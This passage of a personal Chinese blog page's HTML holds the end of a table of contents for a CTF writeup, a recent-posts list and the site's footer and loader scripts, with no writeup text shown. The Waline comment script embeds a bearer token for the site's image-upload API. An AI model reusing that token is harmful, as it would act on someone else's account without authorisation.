href="#%E5%AE%89%E8%A3%85%E5%85%B6%E4%BB%96%E8%BD%AE%E5%AD%90%E5%92%8C%E6%A8%A1%E5%9D%97"><span class="toc-number">1.12.4.</span> <span class="toc-text">安装其他轮子和模块</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#pycryptodome-Crypto%E6%A8%A1%E5%9D%97"><span class="toc-number">1.12.4.1.</span> <span class="toc-text">pycryptodome(Crypto模块)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#distorm3"><span class="toc-number">1.12.4.2.</span> <span class="toc-text">distorm3</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.12.4.3.</span> <span class="toc-text">mimikatz</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%AC%E5%90%8E%E7%82%AE%E7%8E%AF%E8%8A%82"><span class="toc-number">1.12.5.</span> <span class="toc-text">马后炮环节</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BGM%E5%9D%8F%E4%BA%86%E5%90%97%EF%BC%9F"><span class="toc-number">1.13.</span> <span class="toc-text">BGM坏了吗？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OSINT-MASTER"><span class="toc-number">1.14.</span> <span class="toc-text">OSINT-MASTER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AmazingGame"><span class="toc-number">1.15.</span> <span class="toc-text">AmazingGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-jail"><span class="toc-number">1.16.</span> <span class="toc-text">ez_jail</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#server-py"><span class="toc-number">1.16.1.</span> <span class="toc-text">server.py</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#template-cc"><span class="toc-number">1.16.2.</span> <span class="toc-text">template.cc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#C-%E7%BC%96%E8%AF%91%E7%9A%849%E4%B8%AA%E9%98%B6%E6%AE%B5"><span class="toc-number">1.16.3.</span> <span class="toc-text">C++编译的9个阶段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84%E9%9D%9E%E9%A2%84%E6%9C%9F%E5%81%9A%E6%B3%95"><span class="toc-number">1.16.4.</span> <span class="toc-text">可能的非预期做法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyjail%EF%BC%88%E8%B5%9B%E5%90%8E%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">1.17.</span> <span class="toc-text">pyjail（赛后做出）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#headach3"><span class="toc-number">2.1.</span> <span class="toc-text">headach3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97"><span class="toc-number">2.2.</span> <span class="toc-text">会赢吗</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A5%E5%AD%A6%E5%95%A6%EF%BC%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">入学啦！</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%8C%E6%8F%A1%E6%9C%AF%E5%BC%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">掌握术式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E5%81%9A%E6%B3%95"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">第二种做法</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A2%AB%E5%B0%81%E5%8D%B0%E4%BA%86"><span class="toc-number">2.2.3.</span> <span class="toc-text">被封印了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%9A%E8%B5%A2%E5%90%97%EF%BC%9F"><span class="toc-number">2.2.4.</span> <span class="toc-text">会赢吗？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%BA%E6%A2%B0%E5%8D%B1%E6%9C%BA"><span class="toc-number">2.3.</span> <span class="toc-text">智械危机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B"><span class="toc-number">2.4.</span> <span class="toc-text">谢谢皮蛋</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%881%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">PangBai 过家家（1）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-1-%E5%88%9D%E5%87%BA%E8%8C%85%E5%BA%90"><span class="toc-number">2.5.1.</span> <span class="toc-text">Level 1: 初出茅庐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-2-%E4%BA%91%E7%A8%8B%E5%8F%91%E8%BD%AB"><span class="toc-number">2.5.2.</span> <span class="toc-text">Level 2: 云程发轫</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-3-%E6%8E%A2%E8%B5%9C%E7%B4%A2%E9%9A%90"><span class="toc-number">2.5.3.</span> <span class="toc-text">Level 3: 探赜索隐</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-4-%E4%B8%8D%E6%82%B1%E4%B8%8D%E5%8F%91"><span class="toc-number">2.5.4.</span> <span class="toc-text">Level 4: 不悱不发</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-5-%E6%B8%90%E5%85%A5%E4%BD%B3%E5%A2%83"><span class="toc-number">2.5.5.</span> <span class="toc-text">Level 5: 渐入佳境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-6-%E4%B8%80%E6%96%B9%E9%80%9A%E8%A1%8C"><span class="toc-number">2.5.6.</span> <span class="toc-text">Level 6: 一方通行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Level-0-%E6%AD%A4%E5%BF%83%E5%AE%89%E5%A4%84%E6%98%AF%E5%90%BE%E4%B9%A1"><span class="toc-number">2.5.7.</span> <span class="toc-text">Level 0: 此心安处是吾乡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%B8%80%E7%A7%92%E5%86%85%E6%89%93%E5%87%BA%E5%85%AB%E5%8F%A5%E8%8B%B1%E6%96%87%E5%90%97"><span class="toc-number">2.6.</span> <span class="toc-text">你能在一秒内打出八句英文吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%97%E5%A4%B1%E7%9A%84%E6%8B%89%E9%93%BE"><span class="toc-number">2.7.</span> <span class="toc-text">遗失的拉链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">2.8.</span> <span class="toc-text">复读机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%882%EF%BC%89%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">2.9.</span> <span class="toc-text">PangBai 过家家（2）（未做出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8B-plus%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">2.10.</span> <span class="toc-text">谢谢皮蛋 plus（未做出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E8%B8%A9%E8%B8%A9%E8%83%8C"><span class="toc-number">2.11.</span> <span class="toc-text">臭皮踩踩背</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Include-Me%EF%BC%88%E6%9C%AA%E8%A7%A3%E5%87%BA%EF%BC%89"><span class="toc-number">2.12.</span> <span class="toc-text">Include Me（未解出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AD%E7%9A%AE%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">2.13.</span> <span class="toc-text">臭皮的计算机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#base64"><span class="toc-number">3.1.</span> <span class="toc-text">base64</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A9%AC%E5%90%8E%E7%82%AE%E7%8E%AF%E8%8A%82"><span class="toc-number">3.1.1.</span> <span class="toc-text">马后炮环节</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#begin"><span class="toc-number">3.2.</span> <span class="toc-text">begin</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86"><span class="toc-number">3.2.1.</span> <span class="toc-text">第一部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86"><span class="toc-number">3.2.2.</span> <span class="toc-text">第二部分</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86"><span class="toc-number">3.2.3.</span> <span class="toc-text">第三部分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezAndroidStudy"><span class="toc-number">3.3.</span> <span class="toc-text">ezAndroidStudy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AE%B5flag"><span class="toc-number">3.3.1.</span> <span class="toc-text">第二段flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AE%B5flag"><span class="toc-number">3.3.2.</span> <span class="toc-text">第四段flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E7%A4%BA"><span class="toc-number">3.3.3.</span> <span class="toc-text">提示</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AE%B5flag"><span class="toc-number">3.3.4.</span> <span class="toc-text">第一段flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AE%B5flag"><span class="toc-number">3.3.5.</span> <span class="toc-text">第三段flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AE%B5flag"><span class="toc-number">3.3.6.</span> <span class="toc-text">第五段flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%88%E5%B9%B6flag"><span class="toc-number">3.3.7.</span> <span class="toc-text">合并flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple-encryption"><span class="toc-number">3.4.</span> <span class="toc-text">Simple_encryption</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-debug"><span class="toc-number">3.5.</span> <span class="toc-text">ez_debug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UPX"><span class="toc-number">3.6.</span> <span class="toc-text">UPX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#drink-TEA%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">3.7.</span> <span class="toc-text">drink_TEA（未做出）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezencrypt%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">3.8.</span> <span class="toc-text">ezencrypt（未做出）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-login"><span class="toc-number">4.1.</span> <span class="toc-text">Real login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Game"><span class="toc-number">4.2.</span> <span class="toc-text">Game</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">5.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Base"><span class="toc-number">5.1.</span> <span class="toc-text">Base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xor"><span class="toc-number">5.2.</span> <span class="toc-text">xor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E7%9C%BC%E7%A7%92%E4%BA%86"><span class="toc-number">5.3.</span> <span class="toc-text">一眼秒了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E5%87%A0%E6%AC%A1%E6%96%B9%EF%BC%9F-%E7%96%91%E6%83%91%EF%BC%81"><span class="toc-number">5.4.</span> <span class="toc-text">这是几次方？ 疑惑！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Since-you-konw-something"><span class="toc-number">5.5.</span> <span class="toc-text">Since you konw something</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-one-and-more-than-two"><span class="toc-number">5.6.</span> <span class="toc-text">Just one and more than two</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1e%E6%80%8E%E4%B9%88%E7%8E%A9%EF%BC%9F"><span class="toc-number">5.7.</span> <span class="toc-text">没e怎么玩？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E7%94%A8%E8%B0%A2%E5%96%B5%EF%BC%88%E6%9C%AA%E5%81%9A%E5%87%BA%EF%BC%89"><span class="toc-number">5.8.</span> <span class="toc-text">不用谢喵（未做出）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Migrate-from-Valine-to-Waline/msedge_1kiyjac8P9.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="从 Valine 迁移到 Waline 全记录"/></a><div class="content"><a class="title" href="/posts/Migrate-from-Valine-to-Waline/" title="从 Valine 迁移到 Waline 全记录">从 Valine 迁移到 Waline 全记录</a><time datetime="2026-02-15T19:00:46.000Z" title="Created 2026-02-16 03:00:46">2026-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/Reverse-Engineering-Cracking-MailMaster/at-748365_1920.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="记一次对某邮箱软件账户数量上限破解"/></a><div class="content"><a class="title" href="/posts/Reverse-Engineering-Cracking-MailMaster/" title="记一次对某邮箱软件账户数量上限破解">记一次对某邮箱软件账户数量上限破解</a><time datetime="2026-01-19T12:34:03.000Z" title="Created 2026-01-19 20:34:03">2026-01-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2025-Year-End-Summary/" title="2025 年终总结"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/2025-Year-End-Summary/image-20251231025211777.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 年终总结"/></a><div class="content"><a class="title" href="/posts/2025-Year-End-Summary/" title="2025 年终总结">2025 年终总结</a><time datetime="2025-12-30T17:10:19.000Z" title="Created 2025-12-31 01:10:19">2025-12-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/bkcrack-known-bytes-attack-decipher/cover.png" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破"/></a><div class="content"><a class="title" href="/posts/bkcrack-known-bytes-attack-decipher/" title="使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破">使用 bkcrack 对 ZipCrypto 加密的 ZIP 文件进行明文爆破</a><time datetime="2025-12-19T12:59:03.000Z" title="Created 2025-12-19 20:59:03">2025-12-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/CTF-PCB2025-Preliminary-Round-Writeup/cover.jpg" onerror="this.onerror=null;this.src='https://assets.bili33.top/img/404/404.png'" alt="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup"/></a><div class="content"><a class="title" href="/posts/CTF-PCB2025-Preliminary-Round-Writeup/" title="2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup">2025 第五届“鹏城杯”联邦网络靶场协同攻防演练（初赛）个人 Writeup</a><time datetime="2025-12-13T11:05:12.000Z" title="Created 2025-12-13 19:05:12">2025-12-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2018 - 2026 By GamerNoTitle</div><div class="framework-info"><span>Framework </span><a href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">All articles in this blog are licensed under CC BY-NC-SA 4.0 unless stating additionally.<br>
<a href="https://icp.gov.moe/?keyword=20213338" target="_blank"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src='https://assets.bili33.top/img/GovMoe/icon120.png' width=20px height=20px></img> 萌ICP备 20213338号</a> | <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.bili33.top/gh/biliCDN/bilicdn.github.io@master/images/favicon.png" width="20px" height="20px"> 本站使用 <a href="https://cdn.bili33.top">哔哩CDN</a> 进行加速<br>
</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.bili33.top/npm/@fancyapps/ui@4.0.31/dist/fancybox.umd.min.js"></script><script src="https://cdn.bili33.top/npm/vanilla-lazyload@17.8.3/dist/lazyload.iife.min.js"></script><script src="https://cdn.bili33.top/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.bili33.top/npm/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.bili33.top/npm/mermaid@9.1.7/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script><script>function loadWaline () {
  function insertCSS () {
    const link = document.createElement("link")
    link.rel = "stylesheet"
    link.href = "https://assets.bili33.top/css/waline.css"
    document.head.appendChild(link)
  }

  function initWaline () {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://waline.bili33.top',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
      imageUploader: (file) => {
        let formData = new FormData();
        let headers = new Headers();
        let query = new URLSearchParams();

        formData.append('file', file);
        headers.append('Authorization', 'Bearer imgbed_YdVn2QPSD7RjaCDYIODMnlyY8wAn3FZD')
        headers.append('User-Agent', 'Paff-Waline/1.0')

        return fetch('https://img.bili33.top/upload', {
          method: 'POST',
          headers: headers,
          body: formData,
        }).then((resp) => resp.json())
        .then((data) => 'https://img.bili33.top' + data[0].src)
      }

    }, {"avatar":"mp","emojiCDN":"https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/","visitor":true,"emoji":["https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibiliHotKey","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibili2233","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/bilibilitv","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Arcaea","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Heybox","https://cdn.bili33.top/gh/GamerNoTitle/ValineCDN@master/Majotabi"],"locale":{"nick":"昵称","nickError":"昵称不能少于3个字符","mail":"邮箱","mailError":"请填写正确的邮件地址","link":"网址","optional":"可选","placeholder":"📌图片上传大小限制 5MB，请友善发言，并遵守相关法律法规。","sofa":"来发评论吧~","submit":"提交","like":"喜欢","cancelLike":"撤销喜欢","reply":"回复","cancelReply":"撤回","comment":"评论","refresh":"刷新","more":"加载更多...","preview":"预览","emoji":"表情","uploadImage":"上传图片","seconds":"秒前","minutes":"分钟前","hours":"小时前","days":"天前","now":"刚刚","uploading":"Uploading","login":"登录","logout":"登出","admin":"Endministrator","sticky":"📌","word":"字","wordHint":"评论字数应在 $0 到 $1 字之间！\\n当前字数：$2","anonymous":"匿名","level0":"Lv0","level1":"Lv1","level2":"Lv2","level3":"Lv3","level4":"Lv4","level5":"Lv5","gif":"表情包","gifSearchPlaceholder":"搜索表情包","profile":"个人资料","approved":"通过","waiting":"待审核","spam":"垃圾","unsticky":"取消置顶","oldest":"倒序","latest":"正序","hottest":"热度","reactionTitle":"你认为这篇文章怎么样？"},"noCopyright":true,"reaction":false}))
  }

  if (typeof Waline === 'function') initWaline()
  else {
    insertCSS()
    getScript('https://assets.bili33.top/js/waline.umd.js').then(initWaline)
  }
}

if ('Waline' === 'Waline' || !true) {
  if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><link rel="stylesheet" href="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.bili33.top/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.bili33.top/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script src="https://cdn.bili33.top/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: true,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', 'UA-138072700-2', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>